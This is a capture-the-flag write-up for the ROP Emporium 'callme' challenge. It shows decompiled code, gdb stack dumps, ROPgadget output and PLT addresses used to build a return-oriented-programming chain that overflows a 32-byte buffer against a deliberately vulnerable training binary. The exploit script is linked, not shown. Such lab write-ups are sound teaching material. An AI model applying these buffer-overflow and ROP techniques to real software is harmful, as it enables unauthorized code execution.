# [callme](https://ropemporium.com/challenge/callme.html)

Let's test the program :

```console
$ ./callme 
callme by ROP Emporium
x86_64

Hope you read the instructions...

> test
Thank you!

Exiting
```

# Static Analysis

Using ghidra we can find those functions :

```C
undefined8 main(void)
{
  setvbuf(stdout,(char *)0x0,2,0);
  puts("callme by ROP Emporium");
  puts("x86_64\n");
  pwnme();
  puts("\nExiting");
  return 0;
}

void pwnme(void)
{
  undefined local_28 [32];
  
  memset(local_28,0,32);
  puts("Hope you read the instructions...\n");
  printf("> ");
  read(0,local_28,512);
  puts("Thank you!");
  return;
}

void usefulFunction(void)
{
  callme_three(4,5,6);
  callme_two(4,5,6);
  callme_one(4,5,6);
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```

In the description of this challenge, we're told we need to call the function `callme_one()`, `callme_two()` and `callme_three()` in that order and with the arguments `0xdeadbeefdeadbeef`, `0xcafebabecafebabe`, `0xd00df00dd00df00d`.

The `read()` function in `pwnme()` expects 512 bytes even tho the `local_28` variable is 32 bytes long. Let's exploit this buffer overflow to redirect program execution.

# Dynamic analysis

Using gdb, we'll find out how many bytes we need to send to modify the return address.  
  
Let's take a look at the stack after we've send 32 bytes :

```gdb
gef➤  r <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*32)')
```

```gdb
────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffda10│+0x0000: 0x4141414141414141	 ← $rsp, $rsi
0x00007fffffffda18│+0x0008: 0x4141414141414141
0x00007fffffffda20│+0x0010: 0x4141414141414141
0x00007fffffffda28│+0x0018: 0x4141414141414141
0x00007fffffffda30│+0x0020: 0x00007fffffffda0a  →  0x4141000000000040 ("@"?)	 ← $rbp
0x00007fffffffda38│+0x0028: 0x0000000000400887  →  <main+0040> mov edi, 0x4009e7
0x00007fffffffda40│+0x0030: 0x0000000000000001
0x00007fffffffda48│+0x0038: 0x00007ffff7a456ca  →  <__libc_start_call_main+007a> mov edi, eax
──────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4008d8 <pwnme+0040>     mov    rsi, rax
     0x4008db <pwnme+0043>     mov    edi, 0x0
     0x4008e0 <pwnme+0048>     call   0x400710 <read@plt>
 →   0x4008e5 <pwnme+004d>     mov    edi, 0x400a16
     0x4008ea <pwnme+0052>     call   0x4006d0 <puts@plt>
     0x4008ef <pwnme+0057>     nop    
     0x4008f0 <pwnme+0058>     leave  
     0x4008f1 <pwnme+0059>     ret    
     0x4008f2 <usefulFunction+0000> push   rbp
```

The rbp is stored right after our input on the stack. Now let's take a look at the `usefulFunction()` we'll need to call :

```gdb
gef➤  disas usefulFunction 
Dump of assembler code for function usefulFunction:
   0x00000000004008f2 <+0>:	push   rbp
   0x00000000004008f3 <+1>:	mov    rbp,rsp
   0x00000000004008f6 <+4>:	mov    edx,0x6
   0x00000000004008fb <+9>:	mov    esi,0x5
   0x0000000000400900 <+14>:	mov    edi,0x4
   0x0000000000400905 <+19>:	call   0x4006f0 <callme_three@plt>
   0x000000000040090a <+24>:	mov    edx,0x6
   0x000000000040090f <+29>:	mov    esi,0x5
   0x0000000000400914 <+34>:	mov    edi,0x4
   0x0000000000400919 <+39>:	call   0x400740 <callme_two@plt>
   0x000000000040091e <+44>:	mov    edx,0x6
   0x0000000000400923 <+49>:	mov    esi,0x5
   0x0000000000400928 <+54>:	mov    edi,0x4
   0x000000000040092d <+59>:	call   0x400720 <callme_one@plt>
   0x0000000000400932 <+64>:	mov    edi,0x1
   0x0000000000400937 <+69>:	call   0x400750 <exit@plt>
End of assembler dump.
```

We can see that the arguments used to call the functions are stored in edi, esi and edx. We'll need some gadgets to modify those :

```console
$ ROPgadget --binary callme | grep rdi
0x0000000000400a3d : add byte ptr [rax], al ; add byte ptr [rbp + rdi*8 - 1], ch ; call qword ptr [rax + 0x23000000]
0x0000000000400a3f : add byte ptr [rbp + rdi*8 - 1], ch ; call qword ptr [rax + 0x23000000]
0x0000000000400a3c : add byte ptr fs:[rax], al ; add byte ptr [rbp + rdi*8 - 1], ch ; call qword ptr [rax + 0x23000000]
0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret
0x00000000004009a3 : pop rdi ; ret
```

We found `0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret` which does exactly what we want.
  
Our last remaining issue being that we need to call the functions `callme_one()`, `callme_two()` and `callme_three()` in that order. But if we take a look at the `usefulFonction()` not only does it not use a `ret` instruction (that we need to redirect program execution), but it also modifies the register before calling those functions in the wrong order.  
  
We'll need to bypass this by directly calling the PLT instructions resolving the address to those functions. We can find these pointers in the disassembled code of the usefulFunction() above :

```gdb
gef➤  x/3i 0x4006f0
   0x4006f0 <callme_three@plt>:	jmp    QWORD PTR [rip+0x200932]        # 0x601028 <callme_three@got.plt>
   0x4006f6 <callme_three@plt+6>:	push   0x2
   0x4006fb <callme_three@plt+11>:	jmp    0x4006c0
gef➤  x/3i 0x400740
   0x400740 <callme_two@plt>:	jmp    QWORD PTR [rip+0x20090a]        # 0x601050 <callme_two@got.plt>
   0x400746 <callme_two@plt+6>:	push   0x7
   0x40074b <callme_two@plt+11>:	jmp    0x4006c0
gef➤  x/3i 0x400720
   0x400720 <callme_one@plt>:	jmp    QWORD PTR [rip+0x20091a]        # 0x601040 <callme_one@got.plt>
   0x400726 <callme_one@plt+6>:	push   0x5
   0x40072b <callme_one@plt+11>:	jmp    0x4006c0
```

We've got all we need, our payload will be : an offset to reach the return address, the gadgets to set the register with the required parameters followed by the function calls in the correct order.

# Exploit

Using [this script](./exploit.py) we get the flag :

```console
$ python3 exploit.py
[*] '/home/coucou/Documents/ROP_Emporium/03_callme/callme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[+] Starting local process '/home/coucou/Documents/ROP_Emporium/03_callme/callme': pid 8665
[*] Switching to interactive mode
callme by ROP Emporium
x86_64

Hope you read the instructions...

> Thank you!
callme_one() called correctly
callme_two() called correctly
ROPE{a_placeholder_32byte_flag!}
[*] Process '/home/coucou/Documents/ROP_Emporium/03_callme/callme' stopped with exit code 0 (pid 8665)
[*] Got EOF while reading in interactive
$
```
